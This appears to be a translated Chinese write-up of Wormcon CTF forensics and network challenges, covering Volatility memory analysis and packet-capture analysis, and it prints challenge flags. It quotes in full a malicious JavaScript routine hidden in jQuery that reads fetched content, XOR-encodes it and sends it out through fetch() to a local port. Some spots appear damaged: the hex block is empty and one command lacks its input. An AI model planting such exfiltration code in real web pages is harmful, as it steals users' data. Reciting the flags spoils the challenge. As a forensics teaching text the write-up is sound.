# Wormcom 0x01（Forensics and Network）

## 译文声明
本文为翻译文章，译文仅供参考，具体内容表达及含义以原文为准。

## Secret Mission

### Part 1
**Description:**
欢迎回来！我们有了一个新项目。由于你在上一个案件中的出色表现，我们将再次交给你一项任务。这次的任务来自政府的一个秘密机构，他们怀疑某人与黑客组织有联系，并提供了该人的系统镜像。报告称此人收到了一条消息和下一步指示，但他声称只收到了预付款和支付详情，没有收到任何消息。你能找到他收到的消息吗？

**cmdline**
查看命令行历史记录，发现notepad打开了Apache日志文件。虽然这里可能不存在flag，但仍可尝试。
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win8SP0x64 cmdline
```

**pslist**
查看进程列表：
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win8SP0x64 pslist
```

**memdump**
然后导出对应的notepad和wordpad进程内存：
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n notepad.exe -D ctf/
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win8SP0x64 memdump -n wordpad.exe -D ctf/
```
但发现notepad和wordpad的进程内存非常大，每个都超过1GB，无法直接用记事本打开。使用010Editor打开也难以提取有效信息。

**filescan**
使用`filescan`插件时无输出，考虑更换profile：
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win8SP0x64 filescan | grep -E "pdf|txt|zip|png"
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep -E "pdf|txt"
```
注意到`Invoice.pdf`文件。

**dumpfiles**
导出该文件进行分析：
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000000570c430 -D ctf/
```

**forensic**
文件可以正常打开。使用010Editor打开后，注意到一段hex代码：
```hex

```
通过`xxd`还原并base64解密得到：
```sh
echo| xxd -p -r
```
最终解密得到flag：
```plaintext
wormcon{PDF_w1th_JS_1s_N0t_4n_0ld_Styl3}
```

### Part 2
**Description:**
他通过一个不常见的浏览器与黑客组织联系。你需要找到他在系统中使用的安装文件名，并确定他是否打开了该浏览器。如果打开了，则计算该浏览器添加的倒数第二个注册表值的MD5；如果没有打开，则计算最后一个注册表值的MD5。

**Tor**
首先想到的是洋葱浏览器（Tor）。我们需要找到可执行文件的文件名，并确认他是否打开过该浏览器，最后提取注册表值。

关于Tor浏览器：
[研究论文：Tor浏览器的法医分析](https://www.researchgate.net/publication/332004753_Forensic_Analysis_of_Tor_Browser_A_Case_Study_for_Privacy_and_Anonymity_on_the_Web)

**volatility**
```sh
/volatility_2.6_lin64_standalone -f mem.raw --profile=Win81U1x64 printkey -K "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
```
得到其值：
```plaintext
C:\Program Files (x86)\Windows NT\Accessories\T0rbR0Ws3R-10.0.1.exe
```

### Part 3
**Description:**
我们发现他为黑客开发了一个web项目，但在匆忙中泄露了关键信息。请找出他无意中泄露的信息。

**apache**
之前的Apache2日志未被充分利用。尝试`filescan`找到`access.log`并导出：
```sh
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win81U1x64 filescan | grep log
./volatility_2.6_lin64_standalone -f mem.raw --profile=Win81U1x64 dumpfiles -Q 0x000000007c87d350 -D ctf/
```

**strings**
使用`strings`输出内容，找到奇怪的URL并进行base64解密，得到flag。

## Network At Risk

### Part 1
**Description:**
我们又遇到了危险。系统发出了一份事件报告，我们捕获了网络流量，但这不是普通的、简单的流量，需要深入分析。由于时间紧迫，我将任务交给你，希望你能找到一些有趣的东西。

查看流量包，总体上分为HTTPS和HTTP两部分。

**http**
注意到最后一个奇怪的HTTP访问。

**malware**
标记该流量包，发现许多CSS和JavaScript文件。HTML文件没有异常，考虑JavaScript中藏有恶意代码。查阅jQuery代码，找到恶意代码块：
```javascript
function a4sSiIgGn_vVa4lLuUe(text) {
    CONTENT = text;
    return 1;
}

function g3tTh3Wh4T(url) {
    var request = new XMLHttpRequest();
    request.open('GET', url, true);
    request.send(null);
    request.onreadystatechange = function () {
        if (request.readyState === 4 && request.status === 200) {
            var type = request.getResponseHeader('Content-Type');
            if (type.indexOf("text") !== 1) {
                a4sSiIgGn_vVa4lLuUe(request.responseText);
                fetch('http://127.0.0.1:1337?' + enCrYpTX0r(CONTENT, k3Y));
            }
        }
    };
}

function enCrYpTX0r(text, key) {
    return Array.from(
        text,
        (c, i) => (c.charCodeAt() ^ key.charCodeAt(i % key.length))
    ).join('s');
}
```

**xor**
可以看到URL后面添加的是经过XOR加密的代码块。找到key后对URL中的参数进行XOR变换即可。

### Part 2
**Description:**
这是我们捕获的另一段网络流量。我们按照你之前的方法处理，但这次不起作用，请帮忙解决。

**ftp**
打开流量包，看到FTP协议流量。跟踪FTP流量，共有100多个TCP流，逐一查看，找到一个加密的zip压缩包。对应于`tcp.stream eq 0`中的数据。